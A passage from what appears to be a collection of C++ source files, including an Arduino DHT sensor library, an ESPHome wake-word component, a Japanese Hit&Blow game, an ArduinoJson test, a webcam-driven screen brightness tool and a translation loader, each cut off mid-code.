@param  S\n *          Scale. Boolean value:\n *\t\t\t\t\t- true = Fahrenheit\n *\t\t\t\t\t- false = Celcius\n *  @param  force\n *          true if in force mode\n *\t@return Temperature value in selected scale\n */\nfloat DHT::readTemperature(bool S, bool force) {\n  float f = NAN;\n\n  if (read(force)) {\n    switch (_type) {\n    case DHT11:\n      f = data[2];\n      if (data[3] & 0x80) {\n        f = -1 - f;\n      }\n      f += (data[3] & 0x0f) * 0.1;\n      if (S) {\n        f = convertCtoF(f);\n      }\n      break;\n    case DHT12:\n      f = data[2];\n      f += (data[3] & 0x0f) * 0.1;\n      if (data[2] & 0x80) {\n        f *= -1;\n      }\n      if (S) {\n        f = convertCtoF(f);\n      }\n      break;\n    case DHT22:\n    case DHT21:\n      f = ((word)(data[2] & 0x7F)) << 8 | data[3];\n      f *= 0.1;\n      if (data[2] & 0x80) {\n        f *= -1;\n      }\n      if (S) {\n        f = convertCtoF(f);\n      }\n      break;\n    }\n  }\n  return f;\n}\n\n/*!\n *  @brief  Converts Celcius to Fahrenheit\n *  @param  c\n *\t\t\t\t\tvalue in Celcius\n *\t@return float value in Fahrenheit\n */\nfloat DHT::convertCtoF(float c) { return c * 1.8 + 32; }\n\n/*!\n *  @brief  Converts Fahrenheit to Celcius\n *  @param  f\n *\t\t\t\t\tvalue in Fahrenheit\n *\t@return float value in Celcius\n */\nfloat DHT::convertFtoC(float f) { return (f - 32) * 0.55555; }\n\n/*!\n *  @brief  Read Humidity\n *  @param  force\n *\t\t\t\t\tforce read mode\n *\t@return float value - humidity in percent\n */\nfloat DHT::readHumidity(bool force) {\n  float f = NAN;\n  if (read(force)) {\n    switch (_type) {\n    case DHT11:\n    case DHT12:\n      f = data[0] + data[1] * 0.1;\n      break;\n    case DHT22:\n    case DHT21:\n      f = ((word)data[0]) << 8 | data[1];\n      f *= 0.1;\n      break;\n    }\n  }\n  return f;\n}\n\n/*!\n *  @brief  Compute Heat Index\n *          Simplified version that reads temp and humidity from sensor\n *  @param  isFahrenheit\n * \t\t\t\t\ttrue if fahrenheit, false if celcius\n *(default true)\n *\t@return float heat index\n */\nfloat DHT::computeHeatIndex(bool isFahrenheit) {\n  float hi = computeHeatIndex(readTemperature(isFahrenheit), readHumidity(),\n                              isFahrenheit);\n  return hi;\n}\n\n/*!\n *  @brief  Compute Heat Index\n *  \t\t\t\tUsing both Rothfusz and Steadman's equations\n *\t\t\t\t\t(http://www.wpc.ncep.noaa.gov/html/heatindex_equation.shtml)\n *  @param  temperature\n *          temperature in selected scale\n *  @param  percentHumidity\n *          humidity in percent\n *  @param  isFahrenheit\n * \t\t\t\t\ttrue if fahrenheit, false if celcius\n *\t@return float heat index\n */\nfloat DHT::computeHeatIndex(float temperature, float percentHumidity,\n                            bool isFahrenheit) {\n  float hi;\n\n  if (!isFahrenheit)\n    t",
    "#include \"micro_wake_word.h\"\n#include \"streaming_model.h\"\n\n#ifdef USE_ESP_IDF\n\n#include \"esphome/core/hal.h\"\n#include \"esphome/core/helpers.h\"\n#include \"esphome/core/log.h\"\n\n#include <string>\n#include <sstream>\n\n#include <frontend.h>\n#include <frontend_util.h>\n\n#include <tensorflow/lite/core/c/common.h>\n#include <tensorflow/lite/micro/micro_interpreter.h>\n#include <tensorflow/lite/micro/micro_mutable_op_resolver.h>\n\n#include <cmath>\n\n// Major TODOs:\n//  - move everything into tasks\n//  - mWW will sit between the microphone and the voice_assistant\n//    - mWW will feed audio samples with VAD and wake word info to the voice assistant\n//  - Allow users, after, compilation, to set which wake words are loaded\n\nnamespace esphome {\nnamespace micro_wake_word {\n\nstatic const char *const TAG = \"micro_wake_word\";\n\nstatic const size_t SAMPLE_RATE_HZ = 16000;  // 16 kHz\nstatic const size_t BUFFER_LENGTH = 64;      // 0.064 seconds\nstatic const size_t BUFFER_SIZE = SAMPLE_RATE_HZ / 1000 * BUFFER_LENGTH;\nstatic const size_t INPUT_BUFFER_SIZE = 32 * SAMPLE_RATE_HZ / 1000;  // 16ms * 16kHz / 1000ms\n\nstatic const size_t FPC_BUFFER_SIZE = SAMPLE_RATE_HZ * 5;  // 5 seconds\n\nfloat MicroWakeWord::get_setup_priority() const { return setup_priority::AFTER_CONNECTION; }\n\nstatic const LogString *micro_wake_word_state_to_string(State state) {\n  switch (state) {\n    case State::IDLE:\n      return LOG_STR(\"IDLE\");\n    case State::START_MICROPHONE:\n      return LOG_STR(\"START_MICROPHONE\");\n    case State::STARTING_MICROPHONE:\n      return LOG_STR(\"STARTING_MICROPHONE\");\n    case State::DETECTING_WAKE_WORD:\n      return LOG_STR(\"DETECTING_WAKE_WORD\");\n    case State::STOP_MICROPHONE:\n      return LOG_STR(\"STOP_MICROPHONE\");\n    case State::STOPPING_MICROPHONE:\n      return LOG_STR(\"STOPPING_MICROPHONE\");\n    case State::UPLOADING_AUDIO:\n      return LOG_STR(\"UPLOADING_AUDIO\");\n    default:\n      return LOG_STR(\"UNKNOWN\");\n  }\n}\n\nvoid MicroWakeWord::dump_config() {\n  ESP_LOGCONFIG(TAG, \"microWakeWord:\");\n  ESP_LOGCONFIG(TAG, \"  models:\");\n  for (auto &model : this->wake_word_models_) {\n    model.log_model_config();\n  }\n#ifdef USE_MICRO_WAKE_WORD_VAD\n  this->vad_model_->log_model_config();\n#endif\n}\n\nvoid MicroWakeWord::setup() {\n  ESP_LOGCONFIG(TAG, \"Setting up microWakeWord...\");\n\n  if (!this->register_streaming_ops_(this->streaming_op_resolver_)) {\n    this->mark_failed();\n    return;\n  }\n\n  ESP_LOGCONFIG(TAG, \"Micro Wake Word initialized\");\n\n  this->frontend_config_.window.size_ms = FEATURE_DURATION_MS;\n  this->frontend_config_.window.step_size_ms = this->features_step_size_;\n  this->frontend_config_.filterbank.num_channels = PREPROCESSOR_FEATURE_SIZE;\n  this->frontend_config_.filterbank.lower_band_limit = 125.0;\n  this->frontend_config_.filterbank.upper_band_limit = 7500.0;\n  this->frontend_config_.noise_reduction.smoothing_bits = 10;\n  this->frontend_config_.noise_reduction.even_smoothing = 0.025;\n  this->frontend_config_.noise_reduction.odd_smoothing = 0.06;\n  this->frontend_config_.noise_reduction.min_signal_remaining = 0.05;\n  this->frontend_config_.pcan_gain_control.enable_pcan = 1;\n  this->frontend_config_.pcan_gain_control.strength = 0.95;\n  this->frontend_config_.pcan_gain_control.offset = 80.0;\n  this->frontend_config_.pcan_gain_control.gain_bits = 21;\n  this->frontend_config_.log_scale.enable_log = 1;\n  this->frontend_config_.log_scale.scale_shift = 6;\n}\n\nvoid MicroWakeWord::add_wake_word_model(const uint8_t *model_start, float probability_cutoff,\n                                        size_t sliding_window_average_size, const std::string &wake_word,\n                                        size_t tensor_arena_size) {\n  this->wake_word_models_.emplace_back(model_start, probability_cutoff, sliding_window_average_size, wake_word,\n                                       tensor_arena_size);\n}\n\n#ifdef USE_MICRO_WAKE_WORD_VAD\nvoid MicroWakeWord::add_vad_model(const uint8_t *model_start, float probability_cutoff, size_t sliding_window_size,\n                                  size_t tensor_arena_size) {\n  this->vad_model_ = make_unique<VADModel>(model_start, probability_cutoff, sliding_window_size, tensor_arena_size);\n}\n#endif\n\nvoid MicroWakeWord::loop() {\n  switch (this->state_) {\n    case State::IDLE:\n      break;\n    case State::START_MICROPHONE:\n      ESP_LOGD(TAG, \"Starting Microphone\");\n      this->microphone_->start();\n      this->set_state_(State::STARTING_MICROPHONE);\n      // this->high_freq_.start();\n      break;\n    case State::STARTING_MICROPHONE:\n      if (this->microphone_->is_running()) {\n        this->set_state_(State::DETECTING_WAKE_WORD);\n      }\n      break;\n    case State::DETECTING_WAKE_WORD:\n      while (!this->has_enough_samples_()) {\n        this->read_microphone_();\n      }\n      this->update_model_probabilities_();\n      if (this->detect_wake_words_()) {\n        ESP_LOGD(TAG, \"Wake Word '%s' Detected\", (this->detected_wake_word_).c_str());\n        this->wake_word_detected_trigger_->trigger(this->detected_wake",
    "#include <iostream>\n#include <vector>\n#include <random>\n#include <chrono>\n#include <string>\n#include <set>\n#include <algorithm>\n#include <cctype>\n#include <numeric>\n#include <unordered_set>\n#include <thread>\n\nusing namespace std;\n\nclass NumberGame {\n\nprivate:\n\n    int N;                  // \u6841\u6570\n    int maxtrycount;        // \u6700\u5927\u8a66\u884c\u56de\u6570\n    int trycount;           // \u73fe\u5728\u306e\u8a66\u884c\u56de\u6570\n    int Level;              // \u30ec\u30d9\u30eb\n    vector<int> answer;     // \u6b63\u89e3\u306e\u6570\u5024\n    unordered_set<string> attemptedGuesses; // \u5165\u529b\u3057\u305f\u6570\u5024\u3092\u8a18\u9332\n\n    // \u6570\u5024\u304c\u5168\u3066\u6570\u5b57\u3067\u3042\u308b\u304b\u3092\u5224\u5b9a\u3059\u308b\u95a2\u6570\n    bool Number(const string str) const {\n        // \u6587\u5b57\u5217\u304c\u7a7a\u306e\u5834\u5408\u306f false\n        if (str.empty()) {\n            return false;\n        }\n        // \u6587\u5b57\u5217\u306e\u3059\u3079\u3066\u306e\u6587\u5b57\u304c\u6570\u5b57\u3067\u3042\u308b\u304b\u3092\u78ba\u8a8d\n        for (char c : str) {\n            if (!std::isdigit(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    // \u6570\u5024\u304c\u5168\u3066\u7570\u306a\u308b\u6570\u5b57\u3092\u4f7f\u3063\u3066\u3044\u308b\u304b\u3092\u5224\u5b9a\u3059\u308b\u95a2\u6570\n    bool Difference(const string str) const {\n        set<char> digits;\n        for (char c : str) {\n            if (digits.find(c) != digits.end()) {\n                return false;\n            }\n            digits.insert(c);\n        }\n        return true;\n    }\n\n\n    // \u30b7\u30e3\u30c3\u30d5\u30eb\u7bc4\u56f2\u306e\u672b\u5c3e\u3092\u8a2d\u5b9a\u3057\u3066\u914d\u5217\u3092\u30b7\u30e3\u30c3\u30d5\u30eb\n    void shuffle(vector<int>& vec) {\n        random_device rnd;\n        mt19937 rondom(rnd());\n        std::shuffle(vec.begin(), vec.end(), rondom);\n    }\n\npublic:\n\n    NumberGame(int digits, int level, int maxTries) : N(digits), Level(level), maxtrycount(maxTries), trycount(0) {\n\n        if ((Level < 1 || Level>3) && (N < 2 || N > 6)) {\n            throw invalid_argument(\"\u30ec\u30d9\u30eb\u30921\u304b\u30893\uff0c\u6841\u6570\u30922\u304b\u30896\u306e\u7bc4\u56f2\u3067\u6307\u5b9a\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\");\n        }\n        else if (N < 2 || N > 6) {\n            throw invalid_argument(\"\u6841\u6570\u30922\u304b\u30896\u306e\u7bc4\u56f2\u3067\u6307\u5b9a\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\");\n        }\n        else if (Level < 1 || Level>3) {\n            throw invalid_argument(\"\u30ec\u30d9\u30eb\u30921\u304b\u30893\u306e\u7bc4\u56f2\u3067\u6307\u5b9a\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\");\n        }\n\n        answer.resize(10);                     //0\u304b\u30899\u307e\u3067\u306e10\u500b\u306e\u8981\u7d20\u3092\u6301\u3064vec\n        iota(answer.begin(), answer.end(), 0); // 0\u304b\u30899\u307e\u3067\u306e\u6574\u6570\u3067\u57cb\u3081\u308b\n        shuffle(answer);                       //0\u304b\u30899\u3067\u57cb\u3081\u3089\u308c\u305fvector\u306e\u8981\u7d20\u3092\u30b7\u30e3\u30c3\u30d5\u30eb\n        answer.resize(N);                      // N\u6841\u306b\u30c8\u30ea\u30df\u30f3\u30b0\n\n    }\n\n    void clear_last_char(int num_chars) {\n        for (int i = 0; i < num_chars; ++i) {\n            cout << '\\b' << ' ' << '\\b' << flush;\n        }\n    }\n\n    void play() {\n\n        cout << N << \"\u6841\u306e\u6574\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << endl;\n\n        while (trycount < maxtrycount) {\n\n            int hit = 0;\n            int blow = 0;\n            string number;\n            vector<string> num;\n\n            while (true) {\n\n                cout << endl;\n                cout << trycount + 1 << \"\u56de\u76ee\u306e\u89e3\u7b54\" << \"  \";\n\n                cin >> number;\n\n\n                if (number.length() != N) {\n                    cout << \"\u6570\u5024\u304c\" << N << \"\u6841\u3067\u306f\u3042\u308a\u307e\u305b\u3093\uff0e\u518d\u5ea6\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << flush;\n                }\n                else if (!Number(number)) {\n                    cout << \"\u5165\u529b\u304c\u5168\u3066\u6570\u5b57\u3067\u306f\u3042\u308a\u307e\u305b\u3093\uff0e\u518d\u5ea6\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << flush;\n                }\n                else if (!Difference(number)) {\n                    cout << \"\u5165\u529b\u304c\u5168\u3066\u7570\u306a\u308b\u6570\u5b57\u3067\u306f\u3042\u308a\u307e\u305b\u3093\uff0e\u518d\u5ea6\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << flush;\n                }\n                else if (attemptedGuesses.find(number) != attemptedGuesses.end()) {\n                    cout << \"\u3053\u306e\u6570\u5024\u306f\u65e2\u306b\u5165\u529b\u3055\u308c\u3066\u3044\u307e\u3059\uff0e\u518d\u5ea6\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << flush;\n                }\n\n                else {\n                    attemptedGuesses.insert(number); // \u5165\u529b\u3092\u5c65\u6b74\u306b\u8ffd\u52a0\n                    break;\n                }\n\n                this_thread::sleep_for(chrono::seconds(3));// \u4e00\u5b9a\u6642\u9593\u5f85\u3064             \n                cout << \"\\r\" << string(100, ' ') << \"\\r\" << flush;     // \u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u6d88\u53bb\uff08\u4e0a\u66f8\u304d\u3057\u3066\u7a7a\u306b\u3059\u308b\uff09 \n\n            }\n\n            vector<int> guess(N);\n            transform(number.begin(), number.end(), guess.begin(), [](char c) { return c - '0'; });//\u5165\u529b\u3057\u305f\u6587\u5b57\u5217\u3092\u30d9\u30af\u30c8\u30eb\u306b\u5909\u63db\n\n            for (int s = 0; s < N; ++s) {\n                if (answer[s] == guess[s]) {\n                    hit++;\n                }\n                else if (find(answer.begin(), answer.end(), guess[s]) != answer.end()) {\n                    blow++;\n                }\n            }\n\n            if (hit == N) {\n                cout << \"Hit:\" << hit << \" Blow:\" << blow << endl;\n                cout << endl;\n                cout << trycount + 1 << \"\u56de\u76ee\u3067\" << \"gameclear\uff01\" << endl;\n                return;\n            }\n\n            cout << \"Hit:\" << hit << \" Blow:\" << blow << endl;\n            trycount++;\n\n        }\n\n        cout << endl;\n        cout << \"gameover!\" << \"\u6b63\u89e3\u306f \";\n\n        for (int i = 0; i < N; i++) {\n            cout << answer[i] << \" \";\n        }\n        cout << \"\u3067\u3059\uff0e\" << endl;\n    }\n};\n\nint main() {\n    try {\n        cout << \"/ Hit&Blow /\" << endl;\n        cout << \"gamestart!!\" << endl;\n        cout << endl;\n\n        int digits;\n        cout << \"\u5f53\u3066\u305f\u3044\u6570\u5b57\u306e\u6841\u6570\u30922\u304b\u30896\u3067\u9078\u3073\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << endl;\n        cout << \"digit: \";\n        cin >> digits;\n        cout << endl;\n\n        int maxTries;\n        int level;\n        cout << \"\u30ec\u30d9\u30eb\u30921\u304b\u30893\u3067\u9078\u3073\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\" << endl;\n        cout << \"1:\u6613\u3057\u3044(\u8a66\u884c\u56de\u6570:12\u56de)\u30002:\u666e\u901a(\u8a66\u884c\u56de\u6570:9\u56de)\u30003:\u96e3\u3057\u3044(\u8a66\u884c\u56de\u6570:6\u56de)\" << endl;\n        cout << \"level:\";\n        cin >> level;\n        cout << endl;\n\n        if (level == 1) {\n       ",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n\nvoid check(std::string originalJson) {\n  JsonDocument doc;\n\n  std::string prettyJson;\n  deserializeJson(doc, originalJson);\n  serializeJsonPretty(doc, prettyJson);\n\n  std::string finalJson;\n  deserializeJson(doc, originalJson);\n  serializeJson(doc, finalJson);\n\n  REQUIRE(originalJson == finalJson);\n}\n\nTEST_CASE(\"Round Trip: parse -> prettyPrint -> parse -> print\") {\n  SECTION(\"OpenWeatherMap\") {\n    check(\n        \"{\\\"coord\\\":{\\\"lon\\\":145.77,\\\"lat\\\":-16.92},\\\"sys\\\":{\\\"type\\\":1,\\\"id\\\":\"\n        \"8166,\\\"message\\\":0.1222,\\\"country\\\":\\\"AU\\\",\\\"sunrise\\\":1414784325,\"\n        \"\\\"sunset\\\":1414830137},\\\"weather\\\":[{\\\"id\\\":801,\\\"main\\\":\\\"Clouds\\\",\"\n        \"\\\"description\\\":\\\"few clouds\\\",\\\"icon\\\":\\\"02n\\\"}],\\\"base\\\":\\\"cmc \"\n        \"stations\\\",\\\"main\\\":{\\\"temp\\\":296.15,\\\"pressure\\\":1014,\\\"humidity\\\":\"\n        \"83,\\\"temp_min\\\":296.15,\\\"temp_max\\\":296.15},\\\"wind\\\":{\\\"speed\\\":2.22,\"\n        \"\\\"deg\\\":114.501},\\\"clouds\\\":{\\\"all\\\":20},\\\"dt\\\":1414846800,\\\"id\\\":\"\n        \"2172797,\\\"name\\\":\\\"Cairns\\\",\\\"cod\\\":200}\");\n  }\n\n  SECTION(\"YahooQueryLanguage\") {\n    check(\n        \"{\\\"query\\\":{\\\"count\\\":40,\\\"created\\\":\\\"2014-11-01T14:16:49Z\\\",\"\n        \"\\\"lang\\\":\\\"fr-FR\\\",\\\"results\\\":{\\\"item\\\":[{\\\"title\\\":\\\"Burkina army \"\n        \"backs Zida as interim leader\\\"},{\\\"title\\\":\\\"British jets intercept \"\n        \"Russian bombers\\\"},{\\\"title\\\":\\\"Doubts chip away at nation's most \"\n        \"trusted agencies\\\"},{\\\"title\\\":\\\"Cruise ship stuck off Norway, no \"\n        \"damage\\\"},{\\\"title\\\":\\\"U.S. military launches 10 air strikes in \"\n        \"Syria, Iraq\\\"},{\\\"title\\\":\\\"Blackout hits Bangladesh as line from \"\n        \"India fails\\\"},{\\\"title\\\":\\\"Burkina Faso president in Ivory Coast \"\n        \"after ouster\\\"},{\\\"title\\\":\\\"Kurds in Turkey rally to back city \"\n        \"besieged by IS\\\"},{\\\"title\\\":\\\"A majority of Scots would vote for \"\n        \"independence now:poll\\\"},{\\\"title\\\":\\\"Tunisia elections possible \"\n        \"model for region\\\"},{\\\"title\\\":\\\"Islamic State kills 85 more members \"\n        \"of Iraqi tribe\\\"},{\\\"title\\\":\\\"Iraqi officials:IS extremists line \"\n        \"up, kill 50\\\"},{\\\"title\\\":\\\"Burkina Faso army backs presidential \"\n        \"guard official to lead transition\\\"},{\\\"title\\\":\\\"Kurdish peshmerga \"\n        \"arrive with weapons in Syria's Kobani\\\"},{\\\"title\\\":\\\"Driver sought \"\n        \"in crash that killed 3 on Halloween\\\"},{\\\"title\\\":\\\"Ex-Marine arrives \"\n        \"in US after release from Mexico jail\\\"},{\\\"title\\\":\\\"UN panel \"\n        \"scrambling to finish climate report\\\"},{\\\"title\\\":\\\"Investigators, \"\n        \"Branson go to spacecraft crash site\\\"},{\\\"title\\\":\\\"Soldiers vie for \"\n        \"power after Burkina Faso president quits\\\"},{\\\"title\\\":\\\"For a man \"\n        \"without a party, turnout is big test\\\"},{\\\"title\\\":\\\"'We just had a \"\n        \"hunch':US marshals nab Eric Frein\\\"},{\\\"title\\\":\\\"Boko Haram leader \"\n        \"threatens to kill German hostage\\\"},{\\\"title\\\":\\\"Nurse free to move \"\n        \"about as restrictions eased\\\"},{\\\"title\\\":\\\"Former Burkina president \"\n        \"Compaore arrives in Ivory Coast:sources\\\"},{\\\"title\\\":\\\"Libyan port \"\n        \"rebel leader refuses to hand over oil ports to rival \"\n        \"group\\\"},{\\\"title\\\":\\\"Iraqi peshmerga fighters prepare for Syria \"\n        \"battle\\\"},{\\\"title\\\":\\\"1 Dem Senate candidate welcoming Obama's \"\n        \"help\\\"},{\\\"title\\\":\\\"Bikers cancel party after police recover \"\n        \"bar\\\"},{\\\"title\\\":\\\"New question in Texas:Can Davis survive \"\n        \"defeat?\\\"},{\\\"title\\\":\\\"Ukraine rebels to hold election, despite \"\n        \"criticism\\\"},{\\\"title\\\":\\\"Iraqi officials say Islamic State group \"\n        \"lines up, kills 50 tribesmen, women in Anbar \"\n        \"province\\\"},{\\\"title\\\":\\\"James rebounds, leads Cavaliers past \"\n        \"Bulls\\\"},{\\\"title\\\":\\\"UK warns travelers they could be terror \"\n        \"targets\\\"},{\\\"title\\\":\\\"Hello Kitty celebrates 40th \"\n        \"birthday\\\"},{\\\"title\\\":\\\"A look at people killed during space \"\n        \"missions\\\"},{\\\"title\\\":\\\"Nigeria's purported Boko Haram leader says \"\n        \"has 'married off' girls:AFP\\\"},{\\\"title\\\":\\\"Mexico orders immediate \"\n        \"release of Marine veteran\\\"},{\\\"title\\\":\\\"As election closes in, \"\n        \"Obama on center stage\\\"},{\\\"title\\\":\\\"Body of Zambian president \"\n        \"arrives home\\\"},{\\\"title\\\":\\\"South Africa arrests 2 Vietnamese for \"\n        \"poaching\\\"}]}}}\");\n  }\n}\n",
    "#include \"WinMain.h\"\r\n#include <csignal>\r\n\r\nHINSTANCE hInstance;\r\nNOTIFYICONDATA nid;\r\nWORD originalGammaArray[3][256];\r\nint minBrightness = 15;\r\nint maxBrightness = 100;\r\n\r\n/**\r\n * @brief Calculates the average brightness of a given frame.\r\n *\r\n * @param frame The input frame from the webcam.\r\n * @return The average brightness value.\r\n */\r\ndouble calculateAverageBrightness(const cv::Mat& frame) {\r\n    cv::Mat gray;\r\n    cv::cvtColor(frame, gray, cv::COLOR_BGR2GRAY);\r\n    cv::Scalar meanBrightness = cv::mean(gray);\r\n    return meanBrightness[0];\r\n}\r\n\r\n/**\r\n * @brief Sets the brightness of the display.\r\n *\r\n * @param brightness The desired brightness level (0-100).\r\n */\r\nvoid setBrightness(int brightness) {\r\n    DISPLAY_DEVICE dd;\r\n    ZeroMemory(&dd, sizeof(dd));\r\n    dd.cb = sizeof(dd);\r\n  \r\n    for (int i = 0; EnumDisplayDevices(NULL, i, &dd, 0); i++) {\r\n        if (dd.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE) {\r\n            HDC hDC = CreateDC(NULL, dd.DeviceName, NULL, NULL);\r\n            if (!hDC) {\r\n                break;\r\n            }\r\n            if (brightness < minBrightness) {\r\n                brightness = minBrightness;\r\n            }\r\n            else if (brightness > maxBrightness) {\r\n                brightness = maxBrightness;\r\n            }\r\n\r\n            WORD gammaArray[3][256];\r\n            for (int i = 0; i < 256; i++) {\r\n                int value = (i * brightness / 100);\r\n                if (value > 255) {\r\n                    value = 255;\r\n                }\r\n                gammaArray[0][i] = gammaArray[1][i] = gammaArray[2][i] = (WORD)((value << 8) | value);\r\n            }\r\n\r\n            SetDeviceGammaRamp(hDC, gammaArray);\r\n            DeleteDC(hDC);\r\n            break;\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @brief Retrieves the current gamma ramp settings.\r\n *\r\n * @param gammaArray Array to store the current gamma ramp values.\r\n * @return True if successful, false otherwise.\r\n */\r\nbool getGammaRamp(WORD gammaArray[3][256]) {\r\n    DISPLAY_DEVICE dd;\r\n    ZeroMemory(&dd, sizeof(dd));\r\n    dd.cb = sizeof(dd);\r\n    for (int i = 0; EnumDisplayDevices(NULL, i, &dd, 0); i++) {\r\n        if (dd.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE) {\r\n            HDC hDC = CreateDC(NULL, dd.DeviceName, NULL, NULL);\r\n            if (!hDC) {\r\n                break;\r\n            }\r\n\r\n            BOOL result = GetDeviceGammaRamp(hDC, gammaArray);\r\n            DeleteDC(hDC);\r\n            return result == TRUE;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\n\r\n/**\r\n * @brief Restores the gamma ramp to the original settings.\r\n *\r\n * @param gammaArray Array containing the original gamma ramp values.\r\n */\r\nvoid restoreGammaRamp(WORD gammaArray[3][256]) {\r\n    DISPLAY_DEVICE dd;\r\n    ZeroMemory(&dd, sizeof(dd));\r\n    dd.cb = sizeof(dd);\r\n\r\n    for (int i = 0; EnumDisplayDevices(NULL, i, &dd, 0); i++) {\r\n        if (dd.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE) {\r\n            HDC hDC = CreateDC(NULL, dd.DeviceName, NULL, NULL);\r\n            if (!hDC) {\r\n                break;\r\n            }\r\n\r\n            SetDeviceGammaRamp(hDC, gammaArray);\r\n            DeleteDC(hDC);\r\n            break; \r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @brief Initializes the NOTIFYICONDATA structure.\r\n *\r\n * @param hInstance Handle to the current instance.\r\n * @param hwnd Handle to the window.\r\n * @param nid Reference to the NOTIFYICONDATA structure.\r\n */\r\nvoid InitializeNotifyIconData(HINSTANCE hInstance, HWND hwnd, NOTIFYICONDATA& nid) {\r\n    ZeroMemory(&nid, sizeof(nid));\r\n    nid.cbSize = sizeof(nid);\r\n    nid.hWnd = hwnd;\r\n    nid.uID = ID_TRAY_ICON;\r\n    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;\r\n    nid.uCallbackMessage = WM_TRAYICON;\r\n    nid.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON));\r\n    wcscpy_s(nid.szTip, L\"Dynamic Brightness Adjuster\");\r\n\r\n    Shell_NotifyIcon(NIM_ADD, &nid);\r\n}\r\n\r\n/**\r\n * @brief Window procedure for handling messages.\r\n * Creates a context menu, gets the position of the tray icon, shows the context menu.\r\n * Destroys the menu, Removes the tray icon and exits.\r\n *\r\n *\r\n * @param hwnd Handle to the window.\r\n * @param uMsg Message identifier.\r\n * @param wParam Additional message information.\r\n * @param lParam Additional message information.\r\n * @return Result of the message processing.\r\n */\r\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\r\n    switch (uMsg) {\r\n    case WM_TRAYICON: {\r\n        if (lParam == WM_RBUTTONDOWN) {\r\n            HMENU hMenu = CreatePopupMenu();\r\n            InsertMenu(hMenu, 0, MF_BYPOSITION, ID_TRAY_EXIT, L\"Exit\");\r\n\r\n            POINT trayIconPosition;\r\n            GetCursorPos(&trayIconPosition);\r\n            SetForegroundWindow(hwnd);\r\n\r\n            TrackPopupMenu(hMenu, TPM_BOTTOMALIGN | TPM_LEFTALIGN, trayIconPosition.x, trayIconPosition.y, 0, hwnd, NULL);\r\n\r\n            DestroyMenu(hMenu);\r\n        }\r\n        break;\r\n    }\r\n    case WM_COMMAND: {\r\n        if (LOWORD(wParam) == ID_TRAY_EXIT) {\r\n            Shell_NotifyIcon(NIM_DELETE, &nid);\r\n ",
    "#include \"langf.h\"\n\n// standart\n#include <algorithm>\n#include <filesystem>\n#include <fstream>\n#include <stack>\n\nnamespace langf\n{\n\tstatic IO s_langIO;\t// holds the information about the library\n\n\tvoid CreateContext(std::string path, const char* extension)\n\t{\n\t\tIO& io = GetContext();\n\n\t\tstd::filesystem::path relativePath = std::filesystem::current_path();\n\t\trelativePath.append(path);\n\n\t\tif (!std::filesystem::is_directory(relativePath))\n\t\t{\n\t\t\tif (!std::filesystem::create_directory(relativePath)) {\n\t\t\t\tio.lastError = \"Failed to create translation path\\n\";\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tio.extension = extension;\n\t\tio.path = relativePath.string();\n\n\t\t// check supported languages\n\t\tfor (const std::filesystem::directory_entry& dirEntry : std::filesystem::recursive_directory_iterator(io.path)) {\n\t\t\tif (std::filesystem::is_directory(dirEntry.path())) {\n\t\t\t\tio.languages.push_back(dirEntry.path().filename().string());\n\t\t\t}\n\t\t}\n\n\t\t// read languages translations\n\t\tfor (auto language : io.languages) {\n\t\t\n\t\t\tstd::filesystem::path path(io.path);\n\t\t\tpath.append(language);\n\t\t\n\t\t\tfor (const std::filesystem::directory_entry& dirEntry : std::filesystem::recursive_directory_iterator(path)) {\n\t\t\t\tif (std::filesystem::is_directory(dirEntry.path())) {\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// a translation file\n\t\t\t\tif (dirEntry.path().extension().string().compare(io.extension) == 0) {\n\t\t\t\t\tstd::string filePath = dirEntry.path().string();\n\t\t\t\t\tstd::string fileName = dirEntry.path().filename().replace_extension().string();\n\t\t\t\t\t\n\t\t\t\t\tstd::string key(language);\n\t\t\t\t\tkey.append(\":\");\n\t\t\t\t\tkey.append(fileName);\n\n\t\t\t\t\tTranslation translationUnit;\n\t\t\t\t\tTranslation::Read(translationUnit, filePath);\n\t\t\t\t\tio.translations.insert({ key, translationUnit });\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t\n\tvoid DestroyContext()\n\t{\n\t\tIO& io = GetContext();\n\t\tio.path.clear();\n\t\tio.languages.clear();\n\t}\n\n\tIO& GetContext()\n\t{\n\t\treturn s_langIO;\n\t}\n\n\tvoid SetLanguage(const char* prefix, Alphabet alphabet)\n\t{\n\t\tIO& io = GetContext();\n\n\t\tfor (size_t i = 0; i < io.languages.size(); i++) {\n\t\t\tif (io.languages[i].compare(prefix) == 0) {\n\n\t\t\t\t// change typing property based on requested locale\n\t\t\t\tsetlocale(LC_CTYPE, AlphabetToString(alphabet));\n\n\t\t\t\tio.currentLanguage = prefix;\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tio.lastError = \"Desired language with prefix '\";\n\t\tio.lastError.append(prefix);\n\t\tio.lastError.append(\"' wasn't implemented\\n\");\n\t}\n\n\tconst 